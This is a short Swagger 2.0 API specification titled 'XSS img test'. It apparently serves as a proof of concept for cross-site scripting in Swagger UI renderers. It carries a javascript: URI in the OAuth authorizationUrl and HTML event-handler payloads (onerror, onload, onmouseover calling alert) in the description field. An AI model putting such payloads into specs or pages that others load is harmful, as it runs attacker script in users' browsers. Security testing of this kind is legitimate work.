swagger: '2.0'
securityDefinitions:
  a:
    type: oauth2
    authorizationUrl: javascript:alert(document.domain)//
info:
  version: "1.0.0"
  title: XSS img test
  description: onload="alert(1)" <img/src=x onerror="alert(2)" onmouseover="alert(3)"> <a href="https://synack.com">click go to synack</a>
paths:
  /:
    get:
      responses:
        200:
          description: Successful response
